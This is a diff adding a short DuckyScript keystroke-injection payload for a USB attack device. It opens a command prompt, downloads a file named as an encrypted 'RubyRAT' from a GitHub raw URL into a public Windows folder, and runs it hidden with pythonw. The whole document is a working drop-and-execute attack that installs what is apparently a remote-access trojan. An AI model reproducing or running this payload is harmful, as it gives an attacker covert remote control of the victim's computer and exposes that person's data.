@@ -1,0 +1,12 @@
+REM
+REM
+DELAY 500
+WIN r
+DELAY 1500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 2000
+STRING curl -o "C:\Users\Public\pythonfile.pyw" https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/RubyRAT1.7Encrypted.txt && start /B pythonw "C:\Users\Public\pythonfile.pyw" && exit
+DELAY 500
+ENTER
